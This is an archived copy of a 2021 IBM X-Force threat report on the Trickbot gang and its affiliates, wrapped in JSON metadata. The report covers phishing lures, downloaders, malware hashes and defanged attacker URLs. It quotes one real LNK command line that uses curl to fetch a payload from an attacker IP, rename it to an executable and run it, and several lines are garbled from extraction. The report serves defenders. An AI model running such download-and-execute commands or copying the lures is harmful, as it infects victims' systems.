{
    "id": "b8d35104-7d35-4d25-972c-1f9c303beb29",
    "created_at": "2023-01-12T15:09:09.065782Z",
    "updated_at": "2025-03-27T02:15:13.917742Z",
    "deleted_at": null,
    "sha1_hash": "1e9ad934e87babf480135c91ac6febfa0d156fe9",
    "title": "2021-10-13 - Trickbot Rising — Gang Doubles Down on Infection Efforts to Amass Network Footholds",
    "authors": "",
    "file_creation_date": "2022-05-29T01:12:29Z",
    "file_modification_date": "2022-05-29T01:12:29Z",
    "file_size": 3064600,
    "plain_text": "# Trickbot Rising — Gang Doubles Down on Infection Efforts to Amass Network Footholds\n\n**securityintelligence.com/posts/trickbot-gang-doubles-down-enterprise-infection/**\n\n[Home&nbsp/](https://securityintelligence.com/) [Advanced Threats](https://securityintelligence.com/category/x-force/threats/)\nTrickbot Rising — Gang Doubles Down on Infection Efforts to Amass Network Footholds\n\n[Advanced Threats October 13, 2021](https://securityintelligence.com/category/x-force/threats/)\nBy [Ole Villadsen co-authored by Charlotte Hammond 11 min read](https://securityintelligence.com/author/ole-villadsen/)\nIBM X-Force has been tracking the activity of ITG23, a prominent cybercrime gang also known as the TrickBot Gang and Wizard Spider.\nResearchers are seeing an aggressive expansion of the gang’s malware distribution channels, infecting enterprise users with Trickbot and\nBazarLoader. This move is leading to more ransomware attacks — particularly ones using the Conti ransomware.\n\n\n-----\n\ns o d 0, o ce obse ed G 3 pa t e t t o add t o a a a e d st but o a ates e0 06 (a a 55 ) a d e0 0\nThese and other cybercrime vendors are infecting corporate networks with malware by hijacking email threads, using fake customer response\nforms and social engineering employees with a fake call center known as BazarCall, which is tracked as Hive0105. In one of their recent\nBazarCall campaigns, ransomware distributors sent fake emails announcing the recipient had purchased tickets for a Justin Bieber concert\ntour. ITG23 is adept at using its distribution channels to increase scale and drive profits.\n\n## Game On\n\n[In recent months, the cybercriminal organization that IBM X-Force threat intelligence tracks as ITG23, also known as Trickbot and Wizard](https://www.ibm.com/security/xforce)\nSpider, has expanded the number and variety of channels it uses to distribute its key initial payloads. In this article, IBM X-Force, together with\n[Cylera analysts, addresses the growing number of campaigns that ITG23 is using to deliver proprietary malware, including distribution through](https://www.cylera.com/)\nother cybercrime groups that X-Force tracks as Hive0105, Hive0106 and Hive0107.\n\n[Earlier this year, ITG23 primarily relied on email campaigns delivering Excel documents and a call center ruse known as BazarCall to deliver](https://www.bleepingcomputer.com/news/security/bazarcall-malware-uses-malicious-call-centers-to-infect-victims/)\nits payloads to corporate users. However, starting around June 2021, ITG23 has partnered with two prominent malware distribution affiliates\nwhile continuing to use existing channels for malware distribution. The new affiliates have added the use of hijacked email threads and\nfraudulent website customer inquiry forms. This move not only increased the volume of its delivery attempts but also diversified delivery\nmethods with the goal of infecting more potential victims than ever.\n\nTrickbot and BazarLoader are two prolific malware variants that are used against organizations across the globe, often to stage targeted\nransomware and extortion attacks. Campaigns IBM has analyzed in the second half of 2021 likely further contributed to a corresponding\n[increase in Conti ransomware attacks.](https://us-cert.cisa.gov/ncas/alerts/aa21-265a)\n\nThis trend increases the ability of ITG23 to infect more enterprise users, raises the risk of ransomware attacks and demands vigilance and\nemployee awareness training. X-Force expects to continue seeing it for the remainder of the year.\n\n## The Evolution of ITG23\n\n[ITG23 is known primarily for developing the Trickbot banking Trojan, which was first identified in 2016 and initially used to facilitate online](https://securityintelligence.com/an-aggressive-launch-trickbot-trojan-rises-with-redirection-attacks-in-the-uk/)\nbanking fraud. Trickbot has evolved in recent years into a modular malware family capable of stealing credentials and moving laterally and is\nbeing used for downloading additional backdoors and ransomware such as Ryuk and Conti.\n\n[ITG23 is also responsible for developing a prolific loader known as BazarLoader and its most common payload, the BazarBackdoor, which](https://exchange.xforce.ibmcloud.com/collection/BazarBackdoor-fdd90c476eaf6a4f73e5f8c1443e3aa4)\n[were first identified in April 2020. Trickbot’s developers were also credited with developing the Anchor backdoor.](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)\n\n[In September 2020, U.S. Cyber Command worked to disrupt ITG23’s operations by poisoning configuration files on its command-and-control](https://www.washingtonpost.com/national-security/cyber-command-trickbot-disrupt/2020/10/09/19587aae-0a32-11eb-a166-dc429b380d10_story.html)\n[(C2) servers. Microsoft, the following month, announced its own efforts to disrupt ITG23 by taking down a large number of their C2 servers.](https://blogs.microsoft.com/on-the-issues/2020/10/20/trickbot-ransomware-disruption-update/)\nThe gang pivoted its infrastructure and continues to operate in the wild. Most recently, ITG23’s move to expand its malware distribution further\n[demonstrates that it was able to recover from last year’s disruptions and the arrest of an ITG23 developer in February 2021.](https://www.justice.gov/opa/pr/latvian-national-charged-alleged-role-transnational-cybercrime-organization)\n\nAs the gang continues to rise, its activity also leads to the potential for more ransomware attacks, particularly using the Conti ransomware,\nwhich is also developed by ITG23. Trickbot and BazarLoader infections often lead to the deployment of Ryuk and Conti ransomware; indeed,\n[there has been an increase in Conti ransomware deployments coinciding with the increase in Trickbot and BazarLoader activity.](https://www.zdnet.com/article/cisa-releases-advisory-on-conti-ransomware-notes-increase-in-attacks-after-more-than-400-incidents/)\n\nOther articles in recent months have also discussed ITG23’s continued efforts to [upgrade its malware, touching on both its fraud operations](https://therecord.media/trickbot-new-attacks-see-the-botnet-deploy-new-banking-module-new-ransomware/)\n[and ransomware attacks. Some examples of the upgraded components are its web-inject and](https://www.kryptoslogic.com/blog/2021/07/trickbot-and-zeus/) [Virtual Network Computing modules and](https://www.bitdefender.com/blog/labs/trickbot-activity-increases-new-vnc-module-on-the-radar)\n[possibly the new Diavol ransomware.](https://securityintelligence.com/posts/analysis-of-diavol-ransomware-link-trickbot-gang/)\n\n## BazarCall Campaigns Persist Into the Fall\n\nPerhaps the most well-publicized distributor of BazarLoader, and occasionally the Trickbot malware, is known as BazarCall (or BazaCall),\nwhich IBM tracks as Hive0105. A phishing email sent to enterprise users lures them into calling a call center to cancel a pending subscription\ncharge. Those who proceed to a website to download a fake cancelation form are thereby infected with BazarLoader.\n\n[BazarCall campaigns began in February 2021 and have continued on a near-weekly basis in recent months, although X-Force has observed a](https://unit42.paloaltonetworks.com/bazarloader-malware/)\ndecrease in the rate of new BazarCall campaigns by late summer 2021. Hive0105 has been a consistent and effective payload distributer for\nITG23. These crafty campaigns often lead to data exfiltration and ransomware deployments. The two groups apparently work closely together\nto convert more attempts into actual infections for ITG23.\n\nBazarCall campaigns vary in themes. Each BazarCall campaign begins with emails sent to a list of targets bearing a theme designed to\npersuade them to contact a call center to address the matter in the email, which is typically a subscription or prize for which they will soon be\ncharged.\n\nIn order to avoid the charges, the target is provided a phone number to call. Unlike typical malware distribution campaigns, there are no\nmalicious attachments or URLs in the email, which is likely a technique that Hive0105 employs to bypass security controls designed to identify\nemails with malicious attachments or links.\n\n\n-----\n\ne es ece t o t s a e a ged o cas bac d scou ts to de a d co ce t t c ets Upo co tact g a audu e t ca ce te\nrepresentative, the target is directed to a fake website for which the domain address is crafted to resemble the theme described in the email.\nMultiple domains are typically set up for each theme, and they are often created, used and discarded within a matter of hours to confound the\nability of security researchers and defenders to quickly identify, analyze and block the sites.\n\n_Figure 1: BazarCall email lure with phone number to call malicious call center_\n\n_Figure 2: A BazarCall infection zone — the domain name is identical to the original with a different TLD_\n\nDuring the course of the conversation with the fraudulent call center representative, the target is also directed to enter information, such as a\n[customer number located in the email, to access their account on the website and ultimately download a malicious Excel file to confirm the](https://www.microsoft.com/security/blog/2021/07/29/bazacall-phony-call-centers-lead-to-exfiltration-and-ransomware/)\ntransaction.\n\nWhen the file is run and macros enabled, these Excel documents download a malicious payload, most often BazarLoader but occasionally\n[Trickbot. These payloads typically download and install Cobalt Strike to continue an attack that leads to data exfiltration and a Conti](https://attack.mitre.org/software/S0154/)\nransomware infection.\n\n## ITG23 Partners With Spam Powerhouse Hive0106 aka TA551\n\nPerhaps the most important development in the distribution schemes of Trickbot and BazarLoader payloads is ITG23’s partnership with the\n[spamming affiliate that X-Force tracks as Hive0106. Also known as TA551, Shathak and UNC2420, this is another financially motivated threat](https://attack.mitre.org/groups/G0127/)\ngroup partnering with elite cybercrime gangs.\n\n[Reportedly active since 2016, Hive0106 previously had distributed payloads such as Valak,](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware) [IcedID and](https://unit42.paloaltonetworks.com/ta551-shathak-icedid/) [QakBot. The group began distributing](https://isc.sans.edu/forums/diary/TA551+Shathak+Word+docs+push+Qakbot+Qbot/27030/)\nTrickbot with the ‘zev’ gtag at the end of June 2021 and switched to BazarLoader by mid-to-late July 2021. In September and October,\nHive0106 also resumed distributing Trickbot using the ‘zem’ and ‘zvs’ gtags, respectively. ITG23 operatives are working with the threat actor\nZeus on matters related to these campaigns, from which the ‘zev,’ ‘zem’ and ‘zvs’ gtag names may be derived.\n\nIn a page taken out of business email compromise (BEC) scam books, Hive0106 campaigns begin with email lures sent to recipients of\nexisting email threads, stolen from email clients during prior infections. The emails include the email thread subject line but not the entire\nthread. Within the email is an archive file containing a malicious attachment and password.\n\n\n-----\n\n_Figure 3: Hive0106 email lure dated August 2021_\n\nDuring these recent Trickbot and BazarLoader campaigns, the malicious document drops an HTML application (HTA) file when macros are\nenabled. HTA files contain hypertext code and may also contain VBScript or JScript scripts, both of which are often used in boobytrapped\n[macros. The HTA file then downloads Trickbot or BazarLoader, which has subsequently been observed downloading Cobalt Strike.](https://isc.sans.edu/forums/diary/TA551+Shathak+continues+pushing+BazarLoader+infections+lead+to+Cobalt+Strike/27738)\n\nHive0106 uses newly created malicious domains to host the payloads for these infection campaigns.\n\n**Example:**\n\n**Word Doc** b98029b52d505131f395b1e941e7805345acab79cba2941d9e56d379cadcbc6c\n\n**URL** hxxp[:]//kennedyamountg[.]com/bmdff/d2lJjqtV753rt0E0JEoPIXRDNr8EO2Pz/2EuYkzkKPzu/miMgbA/II26dwutnli5q2pz5ViYzSVV\ncid=r37uER9X32RAY3kB&ref=JfZpcN&user=eq8sqbhcG5f9S7D0lKw1VW&ref=9GOjnEyj3uiMaOM6bIc55Lj6k4iZRe&id=kjdgYhK\n\n**BazarLoader** 4e5d9bd32f4bdefa15b98e041776db8c4e81524df31c80bf2ab2ea439eca3ff7\n\n## Hive0107 Shifts to Trickbot and BazarLoader Deliveries\n\nThis summer, ITG23 also partnered with another prominent affiliate that X-Force tracks as Hive0107 to distribute Trickbot and BazarLoader.\n[The group previously had been spotted distributing IcedID in early 2021.](https://www.microsoft.com/security/blog/2021/04/09/investigating-a-unique-form-of-email-delivery-for-icedid-malware/)\n\nX-Force and Cylera analysts observed Hive0107 with occasional distribution campaigns of the Trickbot malware detected mid-May through\n[mid-July 2021. Those used the gtag ‘mod.’ After that period, Hive0107 switched entirely to delivering BazarLoader. IBM’s analysis of](https://isc.sans.edu/diary/27816) [Quad9’s](https://www.quad9.net/)\nDomain Name System (DNS) data indicates that the group primarily targets organizations in the United States and, to a lesser extent, Canada\nand Europe.\n\nHive0107 is known for using customer contact forms on organization websites to send malicious links to unwitting employees. The group\ntypically enters information into these contact forms — probably using automated methods — informing the targeted organization that it has\nillegally used copyrighted images and includes a link to their evidence.\n\nThe links are hosted on well-known, legitimate cloud storage services and file drives that most organizations use. The content often includes\nprovocative language threatening legal action and fines if the images are not removed — pressure tactics to compel the recipient to click on\nthe link.\n\nStarting in late August 2021, Hive0107 began using a new ruse, informing the targeted company that its website has been performing\ndistributed denial of service (DDoS) attacks on its servers and providing a link with the supposed evidence and how to ‘fix’ the problem.\n\nLegitimate email services abused by Hive0107 are then used to deliver the content entered into the customer inquiry form via email to staff\nwithin the targeted organization. This technique might allow Hive0107 to bypass some security measures since the email would arrive from a\nknown sender.\n\n\n-----\n\n_Figure 4: Hive0107 ‘Stolen Images Evidence’ lure, July 2021_\n\n_Figure 5: Hive0107 link to download malicious JScript downloader_\n\nClicking on the link downloads a ZIP archive containing a malicious JScript (JS) downloader titled ‘Stolen Images Evidence.js’ or ‘DDoS attack\nproof and instructions on how to fix it.js.’ The JS file contacts a URL on newly created domains to download BazarLoader, which has been\n[observed subsequently downloading Cobalt Strike and a PowerShell script to exploit the](https://twitter.com/Unit42_Intel/status/1417570775897411591?s=20) [PrintNightmare vulnerability (CVE-2021-34527).](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)\n\n[These BazarLoader samples have also been observed downloading Trickbot. IBM suspects that access achieved through these Hive0107](https://twitter.com/Unit42_Intel/status/1417570775897411591?s=20)\ncampaigns is ultimately used to initiate a ransomware attack.\n\n**Example:**\n\n**ZIP** 7e689467837c7a3751aa45c486371df48204f9c82df20dcb144df4dd800be6b6\n\n**JScript** 63fb96f834ad1d1690ed31644b7103191ff385f7864e8e6388a0d78158e473dc\n\n**Initial URL** hxxp[:]//mulenoras[.]space/333g100/index.php\n\n**Final URL** hxxp[:]//mulenoras[.]space/333g100/main.php\n\n**BazarLoader** 754a35180c3545e644e82f3a075779f49e99ba7a525dd580e437f13a81efd2b5\n\n## Multiple Additional Campaigns Delivering Trickbot, BazarLoader\n\nBeyond the ones mentioned so far, X-Force and Cylera analysts have observed a number of additional campaigns on a weekly basis\ndelivering Trickbot and, to a lesser extent, BazarLoader. The vast majority of the Trickbot campaigns since June 2021 use the ‘rob’ gtag,\nalthough researchers have also seen a small number of campaigns using the ‘sat,’ ‘soc1’ and ‘fat1’ gtags. These campaigns use malicious\nMicrosoft Office, Microsoft Shortcut (LNK) and JS downloaders delivered as email attachments.\n\n\n-----\n\no ce suspects t ese a c ous ca e es a e co e c a a d sou ced o ot e a a e supp e s so e cases, sa t ese es\ndeliver other malware with no relationship to ITG23, such as the Zeppelin ransomware. Researchers are not certain as to whether ITG23 itself\ncontrols the delivery of these malicious emails using dedicated personnel or whether they are independently distributed by other affiliates, such\nas Hive0106 and Hive0107. Some of these campaigns may be delivered by threat actors using the handles ‘Netwalker’ and ‘Cherry,’ who are\nbelieved to be working within the ITG23 organization and earlier this year delivered Trickbot using the gtags ‘net’ and ‘che.’ Below are\ndescriptions of three of these campaigns.\n\n## JScript Downloaders\n\nBeginning in mid-July and for approximately a month, X-Force and Cylera analysts observed the use of a heavily obfuscated JS downloader to\ndeliver primarily Trickbot payloads with the ‘rob’ gtag. Prior to their use, these payloads were delivered by malicious Excel documents. Analysts\nsuspect the JS files were delivered as an email attachment, possibly contained within a ZIP archive.\n\nExecuted with wscript, the JS file decodes and runs a PowerShell (PS) script that contacts an initial URL from which it downloads and\nexecutes a second PS script — ‘wscript’ is the Windows Script Host that provides an environment in which users can execute scripts in a\nvariety of languages that use object models to perform tasks. The second PS script then downloads and executes Trickbot or, occasionally,\nBazarLoader from a final URL.\n\nThe majority of the initial URLs were hosted on IP addresses or compromised domains. The final URLs containing the payload were at times\nhosted on the same or different IP addresses or compromised domains. Many of the campaigns from late July to early August 2021 hosted the\npayload on a document management solution that enables customers to create a publicly accessible link to hosted documents. Similar to\nhosting malware on cloud servers, abusing a legitimate document management service is more likely to bypass some security controls.\n\n**Example:**\n\n**JScript** 801a3a4a079c2adcd944ced54d9371981f7e40dc94e351bc95c26695e3bb676e\n\n**Initial URL** hxxp[:]//officialbirulaut[.]com/deliveryagent.php\n\n**Final URL** hxxps[:]//docs.zohopublic[.]com/downloaddocument.do?docId =872ked1f92660fd6e4478a7cd65df1c1bae9&docExtn=pdf\n\n**Trickbot** cd774e6a643ce65364e57bdd6e4eea43c08ad5ac157d43d9c232e7bbdce81dd4\n\n## Excel Downloaders\n\nIn mid-August 2021, IBM observed the resumption of Excel downloaders to deliver Trickbot payloads with the ‘rob’ gtag. One such campaign\nfrom August 2021 made use of email lures purporting to come from an automotive parts provider, containing a malicious Excel file using 4.0\nmacros. [Excel 4.0 macro, also known as XLM 4.0 macro, is a benign record-and-playback feature of Microsoft Excel that was introduced back](https://www.opswat.com/blog/excel-4-0-macro-old-feature-new-attack-technique)\nin 1992. When run, the Excel document downloads and executes a Trickbot payload with gtag rob122.\n\n_Figure 6: Email lure distributing Trickbot_\n\n**Example:**\n\n**Excel** 9926a3002477464e839c44c2574f5e159f142a2822ed895b4df1196f7137030a\n\n**URL** hxxp[:]//91.92.109[.]16/images/redtank.png\n\n**Trickbot** 12ce566234cbdf2373c179455041e70769b99f0e8f3b66a322e833e1eba9eafb\n\n## Shortcut File Downloaders\n\n\n-----\n\nSepte be 0, o ce a d Cy e a a a ysts de t ed ca pa g s de e g c bot us g c oso t S o tcut ( ) es ese\ncampaigns leverage emails that contain a malicious URL that downloads an archive file containing a LNK file. When executed, the LNK file\n[downloads and executes Trickbot with the ‘rob’ gtag. Some of these LNK files use the ‘curl’ command-line tool to download the malicious](https://curl.se/)\npayload; ‘curl’ is most often used in command lines or scripts to transfer data, for example:\n\nC:\\Windows\\System32\\cmd.exe /c @echo off & start mspaint.exe & curl –silent -L\nHXXP://148.163.42[.]194/images/finesloters.png -o C:\\Users\\…\\AppData\\Roaming\\create.doc&cd\n\nC:\\Users\\…\\AppData\\Roaming&ren create.doc create.exe&start create.exe\n\n**Example:**\n\n\n**URL**\n**(Download):**\n\n\nhxxps[:]//d15k2d11r6t6rl.cloudfront[.]net/public/users/BeeFree/beefreeg2q1yxtiyaf/zoom/IMG_Zoom_CONF_13092021.zip\n\n\n**ZIP Archive** 625444b6cf2c3561a1a9561bb9de599b8bad7cac4a49d32f0ff3594bb2b626a9\n\n**LNK file** c7e517651d96dccd4f3b6b274f638e7615619fde1e4907674fe27d45247c1d43\n\n**URL (Trickbot)** hxxp[:]//148.163.42[.]194/images/finesloters.png\n\n**Trickbot** 986983c93157ff926bde54bc260d3cf20500f772ec8ad1ba9685463924d9d866\n\n## TrickBot Campaigns Correlate With Increase in Conti Ransomware\n\n[The increase in Trickbot and BazarLoader deliveries since June 2021 likely led to a corresponding increase in Conti ransomware attacks this](https://twitter.com/AltShiftPrtScn/status/1431423623621918727?s=19)\nsummer. As noted above, BazarLoader and Trickbot deliveries are often followed by ransomware attacks, including attacks with Conti. The\nCybersecurity and Infrastructure Security Agency (CISA) as of late September observed an increase in the use of Conti ransomware, issuing\n[an advisory about rising risks.](https://us-cert.cisa.gov/ncas/alerts/aa21-265a)\n\n## A Threat Bazar on the Rise\n\nITG23 started out aggressively back in 2016 and has become a cybercrime staple in the East European threat actor arena. In 2021, the group\nhas repositioned itself among the top of the cybercriminal industry, a trend IBM expects to continue into next year.\n\nThe group already has demonstrated its ability to maintain and update its malware and infrastructure, despite the efforts of law enforcement\nand industry groups to take it down. ITG23 has also adapted to the ransomware economy through the creation of the Conti ransomware-as-aservice (RaaS) and the use of its BazarLoader and Trickbot payloads to gain a foothold for ransomware attacks. This latest development\ndemonstrates the strength of its connections within the cybercriminal ecosystem and its ability to leverage these relationships to expand the\nnumber of organizations infected with its malware.\n\n## Recommendations\n\nRansomware and extortion go hand in hand nowadays. For a guide on response to attacks, please visit:\n[www.ibm.com/downloads/cas/EV6NAQR4](https://www.ibm.com/downloads/cas/EV6NAQR4)\n\n[If you are charged with securing your organizational networks, here are some tips from X-Force to reduce the chance of infection.](https://www.ibm.com/security/services/ibm-x-force-incident-response-and-intelligence)\n\nEstablish and maintain backup routines, including offline backups. Ensure you have backup redundancy stored separately from network\nzones attackers could access with read-only access. The availability of effective backups is a significant differentiator for organizations\nand can support recovery from a ransomware attack.\nImplement a strategy to prevent unauthorized data theft, especially as it applies to uploading large amounts of data to legitimate cloud\nstorage platforms that attackers can abuse.\nEmploy user behavior analytics to identify potential security incidents. When triggered, assume a breach has taken place. Audit, monitor\nand quickly act on suspected abuse related to privileged accounts and groups.\nEmploy multifactor authentication on all remote access points into an enterprise network — with particular care given to secure or disable\nremote desktop protocol (RDP) access. Multiple ransomware attacks have been known to exploit weak RDP access to gain initial entry\ninto a network.\n\n[Ole Villadsen](https://securityintelligence.com/author/ole-villadsen/)\nCyber Threat Hunt Analyst, IBM Security\n\nOle Villadsen is an analyst on the Threat Hunt & Discovery Team within IBM X-Force Incident Response and Intelligence Services (IRIS),\nwhere he investiga...\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-13 - Trickbot Rising — Gang Doubles Down on Infection Efforts to Amass Network Footholds.pdf"
    ],
    "report_names": [
        "2021-10-13 - Trickbot Rising — Gang Doubles Down on Infection Efforts to Amass Network Footholds.pdf"
    ],
    "threat_actors": [
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ee3363a4-e807-4f95-97d8-b603c31b9de1",
            "created_at": "2023-01-06T13:46:38.485884Z",
            "updated_at": "2025-03-27T02:00:02.845851Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "Camouflage Tempest",
                "MageCart Group 6",
                "G0037",
                "TA4557",
                "SKELETON SPIDER",
                "ITG08",
                "White Giant",
                "GOLD FRANKLIN",
                "ATK88"
            ],
            "source_name": "MISPGALAXY:FIN6",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "12517c87-040a-4627-a3df-86ca95e5c13f",
            "created_at": "2022-10-25T16:07:23.61665Z",
            "updated_at": "2025-03-27T02:02:09.889471Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "ATK 88",
                "Camouflage Tempest",
                "FIN6",
                "Gold Franklin",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "TAG-CR2",
                "White Giant"
            ],
            "source_name": "ETDA:FIN6",
            "tools": [
                "AbaddonPOS",
                "Agentemis",
                "AmmyyRAT",
                "Anchor_DNS",
                "BlackPOS",
                "CmdSQL",
                "Cobalt Strike",
                "CobaltStrike",
                "FlawedAmmyy",
                "FrameworkPOS",
                "Grateful POS",
                "JSPSPY",
                "Kaptoxa",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LockerGoga",
                "MMon",
                "Magecart",
                "Meterpreter",
                "Mimikatz",
                "More_eggs",
                "NeverQuest",
                "POSWDS",
                "Reedum",
                "Ryuk",
                "SCRAPMINT",
                "SONE",
                "SpicyOmelette",
                "StealerOne",
                "Taurus Loader Stealer Module",
                "Terra Loader",
                "TerraStealer",
                "Vawtrak",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "cobeacon",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d1f8bd4e-bcd4-4101-9158-6158f1806b38",
            "created_at": "2023-01-06T13:46:39.487358Z",
            "updated_at": "2025-03-27T02:00:03.107568Z",
            "deleted_at": null,
            "main_name": "BazarCall",
            "aliases": [
                "BazaCall",
                "BazzarCall"
            ],
            "source_name": "MISPGALAXY:BazarCall",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b3acfb48-b04d-4d3d-88a8-836d7376fa2e",
            "created_at": "2024-06-19T02:03:08.052814Z",
            "updated_at": "2025-03-27T02:05:17.368029Z",
            "deleted_at": null,
            "main_name": "GOLD FRANKLIN",
            "aliases": [
                "ITG08 ",
                "MageCart Group 6 ",
                "Skeleton Spider ",
                "White Giant ",
                "FIN6 "
            ],
            "source_name": "Secureworks:GOLD FRANKLIN",
            "tools": [
                " Metasploit",
                " Meterpreter",
                " Mimikatz",
                " PowerSploit",
                " PowerUpSQL",
                " RemCom",
                "FrameWorkPOS"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
